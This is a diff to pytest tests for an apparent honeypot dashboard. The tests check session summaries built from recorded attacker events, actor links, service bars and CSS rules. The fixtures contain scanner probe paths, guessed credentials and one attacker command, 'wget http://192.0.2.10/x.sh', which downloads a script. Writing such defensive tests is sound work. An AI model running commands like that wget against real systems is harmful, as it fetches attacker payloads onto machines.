@@ -2,6 +2,7 @@
 
 import re
 from datetime import UTC, datetime, timedelta
+from pathlib import Path
 
 import pytest
 from fastapi.testclient import TestClient
@@ -30,8 +31,14 @@ def _event(i, action, at=0, service="ssh", **fields):
     )
 
 
-def _hit(rule_id, name, family):
-    return {"rule_id": rule_id, "name": name, "family": family, "attack": [], "evidence": []}
+def _hit(rule_id, name, family, evidence=()):
+    return {
+        "rule_id": rule_id,
+        "name": name,
+        "family": family,
+        "attack": [],
+        "evidence": list(evidence),
+    }
 
 
 # ---------- the story: a pure function, unit-tested on hand-built events ----------
@@ -89,7 +96,7 @@ def test_story_for_a_web_session_with_probes_and_logins():
             credential={"username": "ops", "password": "b"},
         ),
     ]
-    hits = [_hit("R2", "Path enumeration", "recon")]
+    hits = [_hit("R2", "Path enumeration", "recon", evidence=["e1", "e2", "e3"])]
     assert data.session_story(events, hits) == (
         f"From {IP} over under a minute: probed 3 scanner paths and tried 2 logins."
     )
@@ -117,6 +124,46 @@ def test_story_says_requested_when_no_recon_rule_fired():
         _event(2, "http_request", at=1, service="web", request={"method": "GET", "path": "/b"}),
     ]
     assert "requested 2 paths" in data.session_story(events, [])
+
+
+def test_story_counts_only_the_distinct_paths_of_the_r2_evidence():
+    # Seven distinct paths and eight requests in all; R2 names four scanner paths (one twice).
+    paths = [
+        "/wp-login.php",
+        "/phpmyadmin/",
+        "/server-status",
+        "/config.php",
+        "/about",
+        "/contact",
+        "/static/app.js",
+        "/wp-login.php",
+    ]
+    events = [
+        _event(
+            i + 1,
+            "http_request",
+            at=i * 5,
+            service="web",
+            request={"method": "GET", "path": path},
+        )
+        for i, path in enumerate(paths)
+    ]
+    hits = [_hit("R2", "Path enumeration", "recon", evidence=["e1", "e2", "e3", "e4", "e8"])]
+    assert data.session_story(events, hits) == (
+        f"From {IP} over under a minute: probed 4 scanner paths."
+    )
+
+
+def test_story_counts_logins_and_commands_as_the_events_recorded():
+    creds = {"username": "ops", "password": "guess"}
+    events = [
+        _event(1, "login_attempt", at=0, credential=creds),
+        _event(2, "login_attempt", at=5, credential=creds),
+        _event(3, "command", at=10, request={"command": "wget http://192.0.2.10/x.sh"}),
+    ]
+    assert data.session_story(events, []) == (
+        f"From {IP} over under a minute: tried 2 logins and ran 1 command including a download."
+    )
 
 
 def test_story_for_a_connection_with_nothing_else():
@@ -290,3 +337,39 @@ def test_empty_store_shows_the_seed_hint(tmp_path, monkeypatch):
     ) in html
     assert "<table" not in html
     assert "honeytoken-banner" not in html
+
+
+def test_banner_names_the_actor_the_way_the_actors_page_does(honey_env, client):
+    actor = data.honeytoken_banner(honey_env["conn"])["actor_id"]
+    link = f'<a class="mono" href="/actor/{actor}">{actor[:16]}</a>'
+    assert link in client.get("/").text
+    assert link in client.get(f"/session/{_banner_session(honey_env)}").text
+    assert "actor actor-" not in client.get("/").text
+
+
+def test_decoy_bars_are_proportional_to_the_share_of_sessions(honey_env):
+    actor = data.session_detail(honey_env["conn"], _session_of(honey_env, ATTACKER[0]))["actor_id"]
+    detail = data.actor_detail(honey_env["conn"], actor)
+    assert sum(b["count"] for b in detail["by_service"]) == detail["sessions"]
+    for b in detail["by_service"]:
+        assert b["share"] == b["count"] / detail["sessions"]
+        assert b["w"] == round(b["share"] * data.SERVICE_BAR_WIDTH)
+
+
+def test_bar_colours_come_from_theme_variables():
+    css = (Path(__file__).resolve().parents[2] / "dashboard/static/app.css").read_text()
+    assert ".f-accent { fill: var(--accent); }" in css
+    assert ".f-track { fill: var(--raise);" in css
+    assert ".svc-bars .panel-body svg { width: 100%; max-width: 320px;" in css
+    assert "fill: #" not in css.split("/* ---------- shell")[0].split(":root")[-1]
+
+
+def test_bignum_divider_is_reset_on_small_screens():
+    css = (Path(__file__).resolve().parents[2] / "dashboard/static/app.css").read_text()
+    assert css.index(".bignum { font") < css.index("@media (max-width: 860px)")
+
+
+def test_overview_rule_chips_wrap_instead_of_clipping():
+    css = (Path(__file__).resolve().parents[2] / "dashboard/static/app.css").read_text()
+    assert "td .chips { flex-wrap: wrap;" in css
+    assert "td .chips { flex-wrap: nowrap;" not in css
